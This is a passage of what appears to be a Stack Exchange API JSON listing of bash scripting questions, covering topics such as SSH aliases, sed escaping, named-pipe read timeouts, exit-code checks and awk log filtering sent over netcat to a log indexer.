{"total":16352,"page":1,"pagesize":100,"questions":[{"tags":["bash","ssh"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":10,"score":1,"question_id":13298487,"title":"Bash Script to SSH into a machine without prompting passord and without using keys","body":"<p>I realize this question has been asked a few times but I could not find a relevant answer anywhere in my searching.</p>\n\n<p>I am working in a development environment where security is not an issue and anyone could just guess the password if the thought for a few seconds.</p>\n\n<p>What I am trying to do is simple. I have created an alias function in my local .bashrc file and I would like this function to automatically log into a machine with a default password.</p>\n\n<p>My current implementation looks something like this:</p>\n\n<pre> \nfunction s () { \n ssh root@192.168.1.$1\n}\n</pre>\n\n<p>When I run it I get something like this:</p>\n\n<pre>\n~]s 122\n\nssh root@192.168.1.122\n\nroot@192.168.1.122's password: \n</pre>\n\n<p>Using Bash, and not using RSA keys I would like to get this to use the default password 'password'.</p>\n"},{"tags":["linux","bash","script","sed"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":13289066,"title":"Bash script writing 2 files with different output elements per input line","body":"<p>I want to use a bash script to process 1 input file into 2 output files, each containing the same number of lines as the input file but with different parts of the input line. In particular one of the output files has to contain a md5hash of a selection of the input line, (hash calculated per line, not per file!):</p>\n\n<p>So</p>\n\n<p><strong>Input_file.txt: ** 3 fields, separated by space</strong></p>\n\n<pre><code>12347654 abcdfg 1verylongalpha1234numeric1\n\n34543673 nvjfur 2verylongalpha1234numeric2\n\n75868643 vbdhde 3verylongalpha1234numeric3\n</code></pre>\n\n<p><strong>output file_1.txt would have to look like this:</strong> (left field is MD5sum, right field is field3 from input file which is also contained in the MD5hash):</p>\n\n<pre><code>12df5j754G75f738fjk3483df3fdf9 1verylongalpha1234numeric1\n\n3jf75j47fh4G84ka9J884hs355jhd8 2verylongalpha1234numeric2\n\n4hf7dn46chG4875ldgkk348fk345d9 3verylongalpha1234numeric3\n</code></pre>\n\n<p><strong>output file_2.txt would have to look like this:</strong> (field1 and field2 from input file + MD5HASH)</p>\n\n<pre><code>12347654 abcdfg 12df5j754G75f738fjk3483df3fdf9\n\n34543673 nvjfur 3jf75j47fh4G84ka9J884hs355jhd8\n\n75868643 vbdhde 4hf7dn46chG4875ldgkk348fk345d9\n</code></pre>\n\n<p>I already have a script that doesthe job but it performs very badly: (script below may not work, this is from the top of my head, no linux here where I write this, sorry)</p>\n\n<pre><code>#!/bin/bash\n\nWhile read line\n\ndo   MD5_HASH=${sed -nr 's/^[[:digit:]]*\\s[[:alpha:]]*\\s([[:alnum:]]*)/\\1/p' &lt;&lt;&lt;$line     | md5sum} \nread $line DATA_PART1 DATA_PART2 DATA_PART3\n\necho \"$MD5_HASH $DATA_PART3\" &gt;&gt; file_1.txt    ##append file_2.txt in loop THIS IS WHERE IT GETS HORRIBLY SLOW!\n\necho \"$DATA_PART1 $DATA_PART2 $MD5_HASH\" \ndone &lt; input_file.txt &gt; file_2.txt\n\nexit 0\n</code></pre>\n\n<p>I think that the \"redirect stdout to file with append construct\" '>>' is responsible for the slow performance, but I can't think of another way. Its in the loop because I have to calculate the md5hash per line.</p>\n\n<p>(and oh, the sed command is necessary because in reality the part that goes into the MD5SUM can only be captured with regex and a quite complex pattern)</p>\n\n<p>So anyone have a suggestion?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":8,"score":0,"question_id":13298255,"title":"How to echo lines of file using bash script and for loop","body":"<p>I have a simple file called dbs.txt\nI want to echo the lines of that file to the screen using a for loop in bash.</p>\n\n<p>The file looks like this:</p>\n\n<pre><code>db1\ndb2\ndb3\ndb4\n</code></pre>\n\n<p>The bash file is called test.sh\nit looks like this</p>\n\n<pre><code>for i in 'cat dbs.txt'; do\necho $i\ndone\nwait\n</code></pre>\n\n<p>When I run the file by typing:</p>\n\n<pre><code>bash test.sh\n</code></pre>\n\n<p>I get the terminal output:</p>\n\n<pre><code>cat dbs.txt\n</code></pre>\n\n<p>instead of the hoped for</p>\n\n<pre><code>db1\ndb2\ndb3\ndb4\n</code></pre>\n\n<p>The following bash file works great:</p>\n\n<pre><code>cat dbs.txt | while read line\ndo\necho \"$line\"\ndone\n</code></pre>\n\n<p>Why doesn't the first script work?</p>\n"},{"tags":["bash","find","output"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":21,"score":1,"question_id":13296428,"title":"how to check permission for the parent folder of a given file in bash","body":"<p>I have this command stored in this variable:</p>\n\n<pre><code>filelist=$(find $dir_name -size $sizeFileTmp -printf '%M %n %u %g %-s %Tb %Td %Tk:%TM %P\\n')\necho \"$filelist\" | sort -rnk5 | awk '{printf \"%s %s %s %s %6s %3s %2s %5s %s\\n\", $1, $2, $3, $4, $5, $6, $7, $8, $9}'\n</code></pre>\n\n<p>that produce this output:</p>\n\n<pre><code>-rwx------ 1 juanpa juanpa 135838 Nov 04 20:47 sample.dir2/testdir2/subdir2/phones\n-rwx------ 1 juanpa juanpa 135838 Nov 04 20:47 sample.dir2/testdir2/phones\n-rwx------ 1 juanpa juanpa 135838 Nov 04 20:47 sample.dir1/testdir1/subdir1/phones\n-rwx------ 1 juanpa juanpa 135838 Nov 04 20:47 sample.dir1/testdir1/phones\n-rwx------ 1 juanpa juanpa 135838 Nov 04 20:47 sample.dir1/.phones\n-rwx------ 1 juanpa juanpa  26615 Nov 04 20:47 sample.dir2/vimtutor\n-rwx------ 1 juanpa juanpa  26615 Nov 04 20:47 sample.dir2/testdir2/vimtutor\n-rwx------ 1 juanpa juanpa  26615 Nov 04 20:47 sample.dir2/testdir2/subdir2/vimtutor\n-rwx------ 1 juanpa juanpa  26615 Nov 04 20:47 sample.dir1/vimtutor\n-rwx------ 1 juanpa juanpa  26615 Nov 04 20:47 sample.dir1/testdir1/vimtutor\n-rwx------ 1 juanpa juanpa  26615 Nov 04 20:47 sample.dir1/testdir1/subdir1/vimtutor\n-rwx------ 1 juanpa juanpa  25557 Nov 04 20:47 sample.dir2/testdir2/subdir2/cdlist\n-rwx------ 1 juanpa juanpa  25557 Nov 04 20:47 sample.dir2/testdir2/cdlist\n-rwx------ 1 juanpa juanpa  25557 Nov 04 20:47 sample.dir2/cdlist\n-rwx------ 1 juanpa juanpa  25557 Nov 04 20:47 sample.dir1/testdir1/subdir1/cdlist\n-rwx------ 1 juanpa juanpa  25557 Nov 04 20:47 sample.dir1/testdir1/cdlist\n-rwx------ 1 juanpa juanpa  25557 Nov 04 20:47 sample.dir1/cdlist\n-rwx------ 1 juanpa juanpa  20558 Nov 04 20:47 sample.dir2/testdir2/subdir2/sample.txt\n-rwx------ 1 juanpa juanpa  20558 Nov 04 20:47 sample.dir2/testdir2/sample.txt\n-rwx------ 1 juanpa juanpa  20558 Nov 04 20:47 sample.dir2/sample.txt\n-rwx------ 1 juanpa juanpa  20558 Nov 04 20:47 sample.dir1/testdir1/subdir1/sample.txt\n-rwx------ 1 juanpa juanpa  20558 Nov 04 20:47 sample.dir1/testdir1/sample.txt\n-rwx------ 1 juanpa juanpa  20558 Nov 04 20:47 sample.dir1/sample.txt\n</code></pre>\n\n<p>My question is how should I check if the folder containing these files DO NOT have write and execute permission and then highlight those lines????</p>\n\n<p>thanks in advance</p>\n"},{"tags":["php","osx","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":14,"score":2,"question_id":13297965,"title":"Mac / OSx - Change PHP version which is call in bash","body":"<p>I have a problem with PHP which is call through bash command \"php\":</p>\n\n<p>In bash:</p>\n\n<blockquote>\n  <p>php -v        # PHP 5.3.17</p>\n  \n  <p>/usr/bin/php  # PHP 5.3.15</p>\n</blockquote>\n\n<p>I want secondary PHP version 5.3.15 as mainly, because in this version I have correctly installed extensions etc. </p>\n\n<p>How can I set <strong>/usr/bin/php</strong> as main -> I want when call \"<em>php -v</em>\" return my 5.3.15 version.</p>\n\n<p>Execuse my bad English, I hope that you understand. </p>\n\n<p>Thank you so much.\nI have Mac OSx Lion</p>\n"},{"tags":["linux","bash"],"answer_count":3,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":84,"score":7,"question_id":13294388,"title":"Why if [ false ]; then echo 'ok'; fi; prints ok?","body":"<p>Why when I type in bash: <code>if [ false ]; then echo 'ok'; fi;</code> I get <code>ok</code> string as a result? The similiar result I can get also when using variable: <code>ok=false; if [ $ok ]; then echo 'ok'; fi;</code></p>\n"},{"tags":["bash","awk","log4j"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":48,"score":2,"question_id":13281695,"title":"Persistent AWK Program","body":"<p>I have been tasked with writing a BASH script to filter log4j files and pipe them over netcat to another host. One of the requirements is that the script must keep track of what it has already sent to the server and not send it again due to licensing constraints on the receiving server (the product on the server is licensed on a data-per-day model).</p>\n\n<p>To achieve the filtering I'm using AWK encapsulated in a BASH script. The BASH component works fine - it's the AWK program that's giving me grief when I try to get it to remember what has already been sent to the server. I am doing this by grabbing the time stamp of a line each time a line matches my pattern. At the end of the program the last time stamp is written to a hidden file in current working directory. On successive runs of the program AWK will read this file in to a variable. Now each time a line matches the pattern it's time stamp is also compared to the one in the variable. If it is newer it is printed, otherwise it is not.</p>\n\n<p>Desired Output:</p>\n\n<blockquote>\n  <p>INFO  2012-11-07 09:57:12,479 [[artifactid].connector.http.mule.default.receiver.02] org.mule.api.processor.LoggerMessageProcessor: MsgID=5017f1ff-1dfa-48c7-a03c-ed3c29050d12 InteractionStatus=Accept InteractionDateTime=2012-08-07T16:57:33.379+12:00 Retailer=CTCT RequestType=RemoteReconnect</p>\n</blockquote>\n\n<p>Hidden File:</p>\n\n<blockquote>\n  <p>2012-10-11 12:08:19,918</p>\n</blockquote>\n\n<p>So that's the theory, now my issue. </p>\n\n<p>The script works fine for contrived/ trivial examples such as:</p>\n\n<blockquote>\n  <p>INFO  2012-11-07 09:57:12,479 [[artifactid].connector.http.mule.default.receiver.02] org.mule.api.processor.LoggerMessageProcessor: MsgID=5017f1ff-1dfa-48c7-a03c-ed3c29050d12 InteractionStatus=Accept InteractionDateTime=2012-08-07T16:57:33.379+12:00 Retailer=CTCT RequestType=RemoteReconnect</p>\n</blockquote>\n\n<p>However, if I run it over a full blown log file with stack traces etc in it then the indentation levels appear to wreck havoc on my program. The first run of the program will produce the desired results - matching lines will be printed and the latest time stamp written to the hidden file. Running it again is when the problem crops up. The output of the program contains the indented lines from stack traces etc (see the block below) and I can't figure out why. This then stuffs the hidden file as the last matching line doesn't contain a time stamp and some garbage is written to it making any further runs pointless.</p>\n\n<p>Undesired output:</p>\n\n<blockquote>\n  <p>at package.reverse.domain.SomeClass.someMethod(SomeClass.java:233)\n      at package.reverse.domain.processor.SomeClass.process(SomeClass.java:129)\n      at package.reverse.domain.processor.someClass.someMethod(SomeClassjava:233)\n      at package.reverse.domain.processor.SomeClass.process(SomeClass.java:129)</p>\n</blockquote>\n\n<p>Hidden file after:</p>\n\n<blockquote>\n  <p>package.reverse.domain.process(SomeClass.java:129)</p>\n</blockquote>\n\n<p>My awk program:</p>\n\n<pre><code>FNR == 1 {\n    CMD = \"basename \" FILENAME\n    CMD | getline FILE;\n    FILE = \".\" FILE \".last\";\n    if (system(\"[ -f \"FILE\" ]\") == 0) {\n        getline FIRSTLINE &lt; FILE;\n        close(FILE);\n        print FIRSTLINE;\n    }\n    else {\n        FIRSTLINE = \"1970-01-01 00:00:00,000\";\n    }\n }\n$0 ~ EXPRESSION {\n    if (($2 \" \" $3) &gt; FIRSTLINE) {\n        print $0;\n        LASTLINE=$2 \" \" $3;\n    }\n}\nEND {\n    if (LASTLINE != \"\") {\n        print LASTLINE &gt; FILE;\n    }\n}\n</code></pre>\n\n<p>Any assistance with finding out why this is happening would be greatly appreciated.</p>\n\n<p>UPDATE:</p>\n\n<p>BASH Script:</p>\n\n<pre><code>#!/bin/bash\nwhile getopts i:r:e:h:p: option\ndo\n    case \"${option}\"\n    in\n        i) INPUT=${OPTARG};;\n        r) RULES=${OPTARG};;\n        e) PATFILE=${OPTARG};;\n        h) HOST=${OPTARG};;\n        p) PORT=${OPTARG};;\n        ?) printf \"Usage: %s: -i &lt;\\\"file1.log file2.log\\\"&gt; -r &lt;\\\"rules1.awk rules2.awk\\\"&gt; -e &lt;\\\"patterns.pat\\\"&gt; -h &lt;host&gt; -p &lt;port&gt;\\n\" $0;\n           exit 1;\n    esac\ndone\n\n#prepare expression with sed\nEXPRESSION=`cat $PATFILE | sed ':a;N;$!ba;s/\\n/|/g'`;\nEXPRESSION=\"^(INFO|DEBUG|WARNING|ERROR|FATAL)[[:space:]]{2}[[:digit:]]{4}\\\\\\\\-[[:digit:]]{1,2}\\\\\\\\-[[:digit:]]{1,2}[[:space:]][[:digit:]]{1,2}:[[:digit:]]{2}:[[:digit:]]{2},[[:digit:]]{3}.*\"$EXPRESSION\".*\";\n\n#Make sure the temp file is empty\necho \"\" &gt; .temp;\n\n#input through awk.\nfor file in $INPUT\ndo\n    awk -v EXPRESSION=\"$EXPRESSION\" -f $RULES $file &gt;&gt; .temp;\ndone\n\n#send contents of file to splunk indexer over udp\ncat .temp;\n#cat .temp | netcat -t $HOST $PORT;\n\n#cleanup temporary files\nif [ -f .temp ]\nthen\n    rm .temp;\nfi\n</code></pre>\n\n<p>Patterns File (The stuff I want to match):</p>\n\n<pre><code>Warning\nException\n</code></pre>\n\n<p>Awk script as above.</p>\n\n<p>Example.log</p>\n\n<pre><code>info  2012-09-04 16:00:11,638 [[adr-com-adaptor-stub].connector.http.mule.default.receiver.02] nz.co.amsco.interop.multidriveinterop: session not initialised\nerror 2012-09-04 16:00:11,639 [[adr-com-adaptor-stub].connector.http.mule.default.receiver.02] nz.co.amsco.adrcomadaptor.processor.comadaptorprocessor: nz.co.amsco.interop.exceptions.systemdownexception\nnz.co.amsco.interop.exceptions.systemdownexception\n    at nz.co.amsco.adrcomadaptor.processor.comadaptorprocessor.getdeviceconfig(comadaptorprocessor.java:233)\n    at nz.co.amsco.adrcomadaptor.processor.comadaptorprocessor.process(comadaptorprocessor.java:129)\n    at org.mule.processor.chain.defaultmessageprocessorchain.doprocess(defaultmessageprocessorchain.java:99)\n    at org.mule.processor.chain.abstractmessageprocessorchain.process(abstractmessageprocessorchain.java:66)\n    at org.mule.processor.abstractinterceptingmessageprocessorbase.processnext(abstractinterceptingmessageprocessorbase.java:105)\n    at org.mule.processor.asyncinterceptingmessageprocessor.process(asyncinterceptingmessageprocessor.java:90)\n    at org.mule.processor.chain.defaultmessageprocessorchain.doprocess(defaultmessageprocessorchain.java:99)\n    at org.mule.processor.chain.abstractmessageprocessorchain.process(abstractmessageprocessorchain.java:66)\n    at org.mule.processor.AbstractInterceptingMessageProcessorBase.processNext(AbstractInterceptingMessageProcessorBase.java:105)\n    at org.mule.interceptor.AbstractEnvelopeInterceptor.process(AbstractEnvelopeInterceptor.java:55)\n    at org.mule.processor.AbstractInterceptingMessageProcessorBase.processNext(AbstractInterceptingMessageProcessorBase.java:105)\n</code></pre>\n\n<p>Usage:</p>\n\n<blockquote>\n  <p>./filter.sh -i \"Example.log\" -r \"rules.awk\" -e \"patterns.pat\" -h host -p port</p>\n</blockquote>\n\n<p>Note that host and port are both unused in this version as the output is just thrown onto stdout.</p>\n\n<p>So if I run this I get the following output:</p>\n\n<blockquote>\n  <p>info  2012-09-04 16:00:11,638 [[adr-com-adaptor-stub].connector.http.mule.default.receiver.02] nz.co.amsco.interop.multidriveinterop: session not initialised\n  error 2012-09-04 16:00:11,639 [[adr-com-adaptor-stub].connector.http.mule.default.receiver.02] nz.co.amsco.adrcomadaptor.processor.comadaptorprocessor: nz.co.amsco.interop.exceptions.systemdownexception\n      at nz.co.amsco.adrcomadaptor.processor.comadaptorprocessor.getdeviceconfig(comadaptorprocessor.java:233)\n      at nz.co.amsco.adrcomadaptor.processor.comadaptorprocessor.process(comadaptorprocessor.java:129)</p>\n</blockquote>\n\n<p>If I run it again on the same unchanged file I should get no output however I am seeing:</p>\n\n<blockquote>\n  <p>nz.co.amsco.adrcomadaptor.processor.comadaptorprocessor.process(comadaptorprocessor.java:129)</p>\n</blockquote>\n\n<p>I have been unable to determine why this is happening.</p>\n"},{"tags":["bash"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":34,"score":0,"question_id":13296863,"title":"What is the difference between wait and sleep?","body":"<p>I was wondering what is difference between <code>wait</code> and <code>sleep</code>.</p>\n\n<p>Regards</p>\n"},{"tags":["apache","bash","file-upload","cgi"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":6,"score":0,"question_id":13296635,"title":"how can I create a cgi file upload form","body":"<p>I am trying to setup a cgi based webpage that would display a file upload form which would then store the uploaded file in a directory on the web server, after which it would trigger a bash script for further server side processing. Having said that, I was wondering if anyone had a suggestion as to what would be the best way to accomplish this? I've looked around and have found several different solutions, but I am not sure if there are any advantages, or if one is better than the other. Thanks</p>\n"},{"tags":["bash","timeout"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":483,"score":2,"question_id":6448632,"title":"'read' not timing out when reading from pipe in bash","body":"<p>I create a pipe using </p>\n\n<pre><code>mkfifo /tmp/foo.pipe\n</code></pre>\n\n<p>Now, I want to try reading from the pipe for a maximum of 2 seconds, so I execute </p>\n\n<pre><code>read -t 2 line &lt; /tmp/foo.pipe\n</code></pre>\n\n<p>The timeout does not occur. Read just sits there waiting for input from the pipe. </p>\n\n<p>The manuals say that 'read' is supposed to work with named pipes. Does anyone have an idea why this is happening? </p>\n\n<pre><code>ls -al /tmp/foo.pipe\nprw-r----- 1 foo bar 0 Jun 22 19:06 /tmp/foo.pipe\n</code></pre>\n"},{"tags":["perl","file","bash","awk","ls"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":38,"score":-2,"question_id":13296068,"title":"How to find last modified file and it's timestamp no later than today?","body":"<p>I have a list of files named filename.${date}, for example foo.20121102 and I want to print the last modified file that has the timestamp  up to today using bash toolset.</p>\n"},{"tags":["linux","bash","shell","login","ssh"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13295303,"title":"loading local shell aliases to ssh session dynamicaly","body":"<p>When I log in to some machine using <strong>ssh</strong> I wish my <strong>aliases</strong> and <strong>functions</strong> are there. In other words, log in to some machine I wish I can use my command shortcuts.</p>\n\n<p>I need it be dynamic, every time I'm log in I wish I have updated aliases. </p>\n\n<p>Notes:\n  Very often it is first time log in, without knowing machine and files there.\n  Sometimes it is single log in. Just one time for that machine. It need to be cleaned afterwards, previous configuration has to be restored too.</p>\n"},{"tags":["bash","grid","jobs"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":17,"score":0,"question_id":13282868,"title":"How to run an script automatically once I check the previous finish?","body":"<p>I have to do several simulation in the grid of my job, but I can do it only one by one (otherwise the grid will give to my jobs less priority). So, I need to run one job and after I check that it is done, send the new one.</p>\n\n<p>To send a job I have to run</p>\n\n<pre><code>run -file test.cfg\n</code></pre>\n\n<p>and to check if it is done, I have to run:</p>\n\n<pre><code>run -status test.cfg\n</code></pre>\n\n<p>where I receive a message showing me if the job is done. I want to run a job once I check the status and it is done.</p>\n\n<p>Thanks!!</p>\n"},{"tags":["linux","bash","shell","gui"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13294098,"title":"Launch a select menu (BASH script) from the GUI with a certain keystroke","body":"<p>I've put together a shell script with a select menu that is launched from the command line. Do you guys have any ideas how I could launch it from the GUI with a certain key stroke? </p>\n\n<p>I was thinking about finding a way to launch the script immediately after switching to one of the virtual terminals..(ctr-alt-f1). Is something like this possible?</p>\n\n<p>GUI Shell script options seem very limited...\nThanks in advanced for the help..</p>\n"},{"tags":["linux","bash","osx","unix","shell"],"answer_count":11,"favorite_count":1,"up_vote_count":10,"down_vote_count":0,"view_count":12723,"score":10,"question_id":97137,"title":"How do you run a script on login in *nix?","body":"<p>I know I once know how to do this but... how do you run a script (bash is OK) on login in unix?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":26,"score":0,"question_id":13294561,"title":"Bash Redirect to a file","body":"<p>I am trying to redirect output of a command to a file. The command I am using (zypper) downloads packages from the internet. The command I am using is</p>\n\n<p>zypper -x -n in geany >> log.txt</p>\n\n<p>The command gradually prints output to the console. The problem I am facing is that the above command writes the command output all at once after the command finishes executing. How do I redirect the bash output as I get it onto the terminal, rather than writing all the command output at the end.</p>\n"},{"tags":["bash","sudo","tail"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":15,"score":0,"question_id":13293625,"title":"GLOBIGNORE does not work with sudo command","body":"<p>I'm using a mini shell script in order to 'tail' (in real time) a bunch of log files.</p>\n\n<pre><code>#!/bin/sh\n\noldGLOBIGNORE=$GLOBIGNORE\n\nexport GLOBIGNORE='foo-bar.log'\n\nsudo -E tail -f -n0 /var/log/*.log\n\nGLOBIGNORE=$oldGLOBIGNORE\n</code></pre>\n\n<p>As you can see, I want to log all files except the one named <code>foo-bar.log</code>. </p>\n\n<p>the <code>-E</code> option of sudo should allow me to keep the <code>GLOBIGNORE</code> variable but it looks like it does not work.</p>\n\n<p>I'm testing on Ubuntu 10.04, bash 4.1.5.</p>\n\n<p>Any clue ?</p>\n"},{"tags":["bash","time","gnu","pipeline"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":13294554,"title":"how to use GNU Time with pipeline","body":"<p>I want to measure the running time of some SQL query in postgresql. Using BASH built-in time, I could do the following:</p>\n\n<pre><code>$ time (echo \"SELECT * FROM sometable\" | psql)\n</code></pre>\n\n<p>I like GNU time, which provides more formats. However I don't know how to do it with pipe line. For simplicity, I use <code>ls | wc</code> in the following examples:</p>\n\n<pre><code>$ /usr/bin/time -f \"%es\" (ls | wc)                                                      \n-bash: syntax error near unexpected token `('\n\n$ /usr/bin/time -f \"%es\" \"ls | wc\"                                                  \n/usr/bin/time: cannot run ls | wc: No such file or directory\n</code></pre>\n\n<p>If I do not group the pipe in any way, it does not complains:</p>\n\n<pre><code>$ /usr/bin/time -f \"%es\" ls | wc       \n0.00s\n</code></pre>\n\n<p>But apparently, this only measure the first part of the pipe, as showing in the next example </p>\n\n<pre><code>$ /usr/bin/time -f \"%es\" ls | sleep 20                                                  \n0.00s \n</code></pre>\n\n<p>So the question is what is the correct syntax for GNU Time with pipe line?</p>\n"},{"tags":["bash","shell","unix","networking","netcat"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":245,"score":3,"question_id":9917065,"title":"How to connect stdin of a list of commands (with pipes) to one of those commands","body":"<p>I need to give the user ability to send/receive messages over the network (using <code>netcat</code>) while the connection is stablished (the user, in this case, is using <code>nc</code> as <strong>client</strong>). The problem is that I need to send a line <strong>before</strong> user starts interacting. My first attempt was:</p>\n\n<pre><code>echo 'my first line' | nc server port\n</code></pre>\n\n<p>The problem with this approach is that <code>nc</code> <em>closes</em> the connection when <code>echo</code> finishes its execution, so the user can't send commands via stdin because the shell is given back to him (and also the answer from server is not received because it delays some seconds to start answering and, as <code>nc</code> closes the connection, the answer is never received by the user).</p>\n\n<p>I also tried grouping commands:</p>\n\n<pre><code>{ echo 'my first line'; cat -; } | nc server port\n</code></pre>\n\n<p>It works almost the way I need, but if server closes the connection, it will wait until I press <code>&lt;ENTER&gt;</code> to give me the shell again. I need to get the shell back when the server closes the connection (in this case, the client - my <code>nc</code> command - will <strong>never</strong> closes the connection, except if I press Ctrl+C).</p>\n\n<p>I also tried named pipes, without success.</p>\n\n<p>Do you have any tip on how to do it?</p>\n\n<blockquote>\n  <p>Note: I'm using openbsd-netcat.</p>\n</blockquote>\n"},{"tags":["bash","parsing"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":32,"score":3,"question_id":13293272,"title":"Parsing data in Bash","body":"<p>I have a file with lots of Rubbish inside. All of it is in one line.\nBut there are often things like: </p>\n\n<pre><code>\"var\":\"value\" \n</code></pre>\n\n<p>Before and after are different characters ...</p>\n\n<p>What I want to do is, to extract only the above mentioned format and put them into a single line. Any ideas how I could realize it in Shell scripting?</p>\n\n<p>Best regards,\nAlex</p>\n"},{"tags":["bash","string","sed","escaping"],"answer_count":5,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":3737,"score":4,"question_id":1064352,"title":"Escaping the '\\' character in the replacement string in a sed expression","body":"<p>I am trying to take a line of text like</p>\n\n<pre><code>    13) Check for orphaned Path entries\n</code></pre>\n\n<p>and change it to (I want the bash color codes to colorize the output, not display on the screen)</p>\n\n<pre><code>\\033[32m*\\033[0m Check for orphaned Path entries\n</code></pre>\n\n<p>with bash color codes to colorize the asterisk to make it stand out more.  I have a sed command that does most of that, except it doesn't handle the color codes correctly since it sees them as references to replacement text.</p>\n\n<p>What I have so far:</p>\n\n<pre><code>sed \"s/ *13) \\(.*\\)/ \\033[32m*\\033[0m \\1/\"\n</code></pre>\n\n<p>which produces the following output when run on the string I gave at the beginning:</p>\n\n<pre><code>   13) Check for orphaned Path entries33[32m*  13) Check for orphaned Path entries33[0m Check for orphaned Path entries\n</code></pre>\n\n<p>It is taking the \\0 of the \\033 and replacing it with the original string.  Doubling the backslashes in the replacement string doesn't make a difference; I still get the same output text.</p>\n\n<p>How do I insert bash color escapes into a sed replacement expression?</p>\n"},{"tags":["linux","bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13292756,"title":"Read first three lines of a file in bash","body":"<p>I have the following shell script to read in the first three lines of file and print them out to screen - it is not working correctly as it prints out lines 2,3,4 instead of lines 1,2,3 - What am I doing wrong ?</p>\n\n<pre><code>exec 6&lt; rhyme.txt\n\nwhile read file &lt;&amp;6 ;\ndo\n        read line1 &lt;&amp;6\n        read line2 &lt;&amp;6\n        read line3 &lt;&amp;6\n\n        echo $line1 \n        echo $line2 \n        echo $line3 \ndone\n\nexec 6&lt;&amp;-\n</code></pre>\n\n<p>Thanks for your answers - I'm am aware of head command but want to use read and file descriptors to display the first three lines </p>\n"},{"tags":["bash","shell","script","sh"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":13292982,"title":"Bash script, read ends the script?","body":"<pre><code>#!/bin/sh\necho \"one\"\nread host\necho \"two\"\nread ip\necho \"three\"\nread oid\nread oid\necho $oid $host &gt;&gt; logger.txt\n</code></pre>\n\n<p>it never makes it to echoing \"two\"</p>\n\n<p>No matter if I pass parameters (this is to receive SNMP traps, and the parameters come) manually in any varied way.</p>\n\n<p>EDIT: This has permissions etc etc, I am testing it by launching it manually, \"one\" is echoed.</p>\n"},{"tags":["bash","qt"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":13293018,"title":"Read a file in Qt as it is being Written","body":"<p>I am writing the output of a bash command in a file. In Qt, I want to read this file, as it is being written to. The command writes the output gradually. How can I achieve something like this?</p>\n"},{"tags":["bash","open-source"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13291687,"title":"Are there any tutorials on how to make open sourced scripts 'installable'?","body":"<p>I've finished a little useful script written in Bash, hosted on github. It's tested and documented. Now, I struggle with how to make it <code>installable</code>, i.e. where should I put it and how.</p>\n\n<p>It seems other such projects use make and configure but I couldn't really find any information on how to do this for bash scripts.</p>\n\n<p>Also I'm unsure into which directory to put my script.</p>\n\n<p>Are there any resources/tutorials regarding this?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>Sry for not being clear. I know how to make it usable by myself but if a user downloads it, it want to provide a means for him to install it easily.</p>\n"},{"tags":["bash","script"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":28,"score":2,"question_id":13292185,"title":"bash if block goes to else every time","body":"<p>The following segment of code goes to the <code>else</code> statement when it should be going into the <code>elif</code>.</p>\n\n<pre><code>    #The following line returns 3, 4 or 5 as the exit code.\n    $BASH_EXEC adbE.sh \"adb $ARGUMENT install $f\"\n    echo \"the return code:$?.\"\n    if [ $? -eq 5 ]\n    then\n            #do nothing, success\n            continue\n    elif [ $? -eq 4 ]\n    then\n            echo \"WARNING\"\n    else\n            echo \"ERROR\"\n            break\n    fi\n</code></pre>\n\n<p>This part: <code>echo \"the return code:$?.\"</code> echoes this to the screen: <code>the return code:4.</code></p>\n\n<p>And it does not display <code>WARNING</code>. It only displays <code>ERROR</code> and then breaks the <code>for</code> loop this code is contained in.</p>\n\n<p>What am i doing wrong?</p>\n\n<hr>\n\n<p>Here are the variations of the condition compare that i have tried resulting in the same issue:</p>\n\n<ol>\n<li><code>if [ $? -eq 5 ]</code></li>\n<li><code>if [ $? -eq \"5\" ]</code></li>\n<li><code>if [ $? == 5 ]</code></li>\n<li><code>if [ $? == \"5\" ]</code></li>\n<li><code>if [[ $? -eq 5 ]]</code></li>\n<li><code>if [[ $? -eq \"5\" ]]</code></li>\n<li><code>if [[ $? == \"5\" ]]</code></li>\n<li><code>if [[ $? == 5 ]]</code></li>\n</ol>\n"},{"tags":["linux","bash","unix","command"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":13282786,"title":"List files over a specific size in current directory and all subdirectories","body":"<p>How can I display all files greater than 10k bytes in my current directory and it's subdirectories.</p>\n\n<p>Tried <code>ls -size +10k</code> but that didn't 